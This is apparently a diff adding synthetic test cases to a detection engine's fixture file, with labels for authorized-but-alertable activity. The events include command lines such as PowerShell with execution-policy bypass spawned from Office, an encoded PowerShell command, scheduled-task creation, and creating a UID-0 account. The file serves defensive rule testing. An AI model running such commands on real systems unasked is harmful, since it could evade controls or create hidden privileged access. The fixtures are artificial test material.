+      "id": "v3-development-office-post-file-bypass",
+      "origin_template": "dev-context-office-boundary",
+      "session_id": "v3-development-session-36",
+      "suspicious": false,
+      "reason": "Authorized document export; Bypass is a script argument rather than an engine policy.",
+      "observability": "supported",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-36",
+          "payload": {
+            "host": "v3-development-36.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+            "command": "pwsh.exe -File \"C:\\Ops\\export.ps1\" -ExecutionPolicy Bypass",
+            "external_id": "v3-development-36",
+            "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-office-normal-file",
+      "origin_template": "dev-context-office-boundary",
+      "session_id": "v3-development-session-37",
+      "suspicious": false,
+      "reason": "Authorized Office script without a hidden/bypass engine setting or file intelligence.",
+      "observability": "supported",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-37",
+          "payload": {
+            "host": "v3-development-37.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+            "command": "pwsh.exe -WindowStyle Normal -File \"C:\\Ops\\publish.ps1\"",
+            "external_id": "v3-development-37",
+            "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-authorized-encoded",
+      "origin_template": "dev-authorized-ambiguity",
+      "session_id": "v3-development-session-38",
+      "suspicious": false,
+      "reason": "Authorized maintenance uses encoded execution without machine-readable action approval; the heuristic should still alert.",
+      "observability": "authorized-but-alertable",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000002"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-38",
+          "payload": {
+            "host": "v3-development-38.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+            "command": "pwsh.exe -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGEAdQB0AGgAbwByAGkAegBlAGQALQBkAGUAdgAtAG0AYQBpAG4AdABlAG4AYQBuAGMAZQAnAA==",
+            "external_id": "v3-development-38"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-authorized-task",
+      "origin_template": "dev-authorized-ambiguity",
+      "session_id": "v3-development-session-39",
+      "suspicious": false,
+      "reason": "Authorized scheduled backup without a scoped approval; intent is benign but the create predicate is met.",
+      "observability": "authorized-but-alertable",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000004"
+      ],
+      "events": [
+        {
+          "source": "sysmon",
+          "sensor": "v3-development-sensor-39",
+          "payload": {
+            "EventID": 1,
+            "UtcTime": "2026-11-16T09:00:00Z",
+            "Computer": "v3-development-39.lab.invalid",
+            "User": "lab\\analyst-development",
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks.exe /Create /SC WEEKLY /TN \"Backup Verify\" /TR \"C:\\Ops\\backup.exe\"",
+            "RecordID": "v3-development-39"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "v3-development-authorized-uid",
+      "origin_template": "dev-authorized-ambiguity",
+      "session_id": "v3-development-session-40",
+      "suspicious": false,
+      "reason": "Authorized isolated recovery lab creates a root-equivalent account; rule has no authorization baseline.",
+      "observability": "authorized-but-alertable",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000005"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "v3-development-sensor-40",
+          "payload": {
+            "host": "v3-development-40.lab.invalid",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\analyst-development",
+            "process": "/usr/sbin/useradd",
+            "command": "/usr/sbin/useradd -o --uid 0 lab_rescue",
+            "external_id": "v3-development-40"
+          }
+        }
+      ],
+      "context": {}
+    }
+  ]
+}
